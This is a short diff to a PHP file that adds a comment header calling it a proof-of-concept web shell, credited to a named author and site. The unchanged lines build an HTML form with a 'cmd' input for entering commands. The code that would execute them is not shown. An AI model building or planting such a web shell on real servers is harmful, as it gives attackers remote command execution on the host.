@@ -1,4 +1,10 @@
 <?php
+
+/*
+ PoC: A simple webshell
+ Author: stayp05 (www.secuacademy.com)
+*/
+
 echo 'Enter a Command:<br>';
 echo '<form action="">';
 echo '<input type=text name="cmd">';
